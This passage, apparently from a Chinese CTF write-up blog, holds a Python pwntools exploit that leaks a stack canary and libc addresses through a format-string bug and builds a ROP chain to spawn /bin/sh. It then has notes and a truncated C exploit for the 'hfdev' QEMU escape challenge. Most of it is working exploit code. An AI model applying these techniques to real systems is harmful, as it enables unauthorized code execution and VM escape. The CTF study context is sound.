class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br><br><br>payload = <span class="hljs-string">b&#x27;%39$p%40$p%41$p%79$p&#x27;</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">2</span> + <span class="hljs-string">b&#x27;%22$hhn&#x27;</span><br>payload = payload.ljust(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + <span class="hljs-string">b&#x27;\x78&#x27;</span><br>p.sendafter(<span class="hljs-string">b&#x27;you.&#x27;</span>, payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>elf.address = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x1543</span><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>] - <span class="hljs-number">243</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(elf.address))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><br>payload = fmtstr_payload(<span class="hljs-number">6</span>, &#123;(stack - <span class="hljs-number">0x128</span>) : (elf.address + <span class="hljs-number">0x146a</span>)&#125;,  write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;you.&#x27;</span>, payload)<br><br>pop_rdi_ret = libc.address + <span class="hljs-number">0x23b72</span><br>pop_rsi_ret = libc.address + <span class="hljs-number">0x2604f</span><br>pop_rdx__r12_ret = libc.address + <span class="hljs-number">0x119241</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x108</span> + p64(canary) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span><br>payload += flat(<br>    pop_rdi_ret, <span class="hljs-number">0</span>,<br>    pop_rsi_ret, stack,<br>    pop_rdx__r12_ret, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>,<br>    libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    pop_rdi_ret, stack,<br>    pop_rdi_ret + <span class="hljs-number">1</span>,<br>    libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>)<br><br>p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br><span class="hljs-comment">#pause()</span><br>p.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹                                    </p><h3 id="hfdev"><a href="#hfdev" class="headerlink" title="hfdev"></a>hfdev</h3><p>è¿™é“qemué€ƒé€¸æœç„¶ä¸ä¼šï¼Œå…·ä½“ç»†èŠ‚å°±çœ‹æœ¬æ–‡å¼€å¤´æ¨èçš„æ–‡ç« ï¼Œè¿™é‡Œå°±è¯´ä¸€ä¸‹è‡ªå·±é‡åˆ°çš„å‘ï¼š</p><ol><li>åˆšå¼€å§‹ç”¨inlå’Œoutlè¯»å†™æ•°æ®ï¼Œä½†å®Œå…¨æ²¡ååº”ï¼Œè¿™é¢˜è¦ç”¨inwå’Œoutwè¯»å†™ã€‚</li><li>æ‰§è¡Œhfdev_processå‡½æ•°åä¸€å®šè¦sleepï¼Œæ„Ÿè§‰åº”è¯¥æ˜¯å¤šçº¿ç¨‹çš„åŸå› ï¼Œexpçš„ä¸»å‡½æ•°æ˜¯ä¸hfdev_processå‡½æ•°åŒæ—¶è¿è¡Œçš„ï¼Œå¦‚æœä¸sleepä¼šé€ æˆæ¡ä»¶ç«äº‰ï¼Œåé¢è®¾ç½®çš„æ•°æ®ä¼šå½±å“ä¸Šä¸€æ¬¡çš„hfdev_processå‡½æ•°çš„æ‰§è¡Œã€‚</li></ol><p>â€‹                                                               </p><p>è¿™é‡Œæ˜¯æœ¬åœ°ubuntu20å¤ç°çš„exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> port_base = <span class="hljs-number">0xc040</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SHIFT  12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">page_offset</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br>    <span class="hljs-comment">// addr &amp; 0xfff</span><br>    <span class="hljs-keyword">return</span> addr &amp; ((<span class="hljs-number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gfn</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> pme, gfn;<br>    <span class="hljs-type">size_t</span> offset;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-comment">//printf(&quot;pfn_item_offset : %p\n&quot;, (uintptr_t)addr &gt;&gt; 9);</span><br>    offset = ((<span class="hljs-type">uintptr_t</span>)addr &gt;&gt; <span class="hljs-number">9</span>) &amp; ~<span class="hljs-number">7</span>;<br>    lseek(fd, offset, SEEK_SET);<br>    read(fd, &amp;pme, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (!(pme &amp; PFN_PRESENT))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    gfn = pme &amp; PFN_PFN;<br>    close(fd);<br>    <span class="hljs-keyword">return</span> gfn;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gpa</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> gfn = gva_to_gfn(addr);<br>    assert(gfn != <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="hljs-type">uint64_t</span>)addr);<br>&#125;<br><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">pmio_read</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> port)</span>&#123;<br>    <span class="hljs-keyword">return</span> inw(port_base + port); <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pmio_write</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> port, <span class="hljs-type">uint64_t</span> value)</span>&#123;<br>    outw(value, port_base + port); <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_addr</span><span class="hljs-params">(<span class="hljs-type">size_t</span> addr)</span>&#123;<br>    pmio_write(<span class="hljs-number">2</span>, addr);<br>    pmio_write(<span class="hljs-number">4</span>, addr &gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_size</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>&#123;<br>    pmio_write(<span class="hljs-number">6</span>, size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_time</span><span class="hljs-params">(<span class="hljs-type">size_t</span> value)</span>&#123;<br>    pmio_write(<span class="hljs-number">10</span>, value);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">exec_bh</span><span class="hljs-params">()</span>&#123;<br>    pmio_write(<span class="hljs-number">12</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> p_addr, <span class="hljs-type">uint16_t</span> size)</span>&#123;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf)) = <span class="hljs-number">0x20</span>;<br>    *((<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">1</span>)) = p_addr;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">9</span>)) = size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_exec_time</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> size, <span class="hljs-type">uint16_t</span> offset)</span>&#123;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf)) = <span class="hljs-number">0x30</span>;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">1</span>)) = size;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">3</span>)) = offset;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_encode1</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> add_byte, <span class="hljs-type">uint8_t</span> xor_byte, <span class="hljs-type">uint16_t</span> size)</span>&#123;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf)) = <span class="hljs-number">0x10</span>;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf + <span class="hljs-number">1</span>)) = add_byte;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf + <span class="hljs-number">2</span>)) = xor_byte;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">3</span>)) = <span class="hljs-number">0x2202</span>;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">5</span>)) = size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_encode2</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> size)</span>&#123;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf)) = <span class="hljs-number">0x10</span>;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">3</span>)) = <span class="hljs-number">0x2022</span>;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">5</span>)) = size;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">size_t</span> pem_buf;<br>    <span 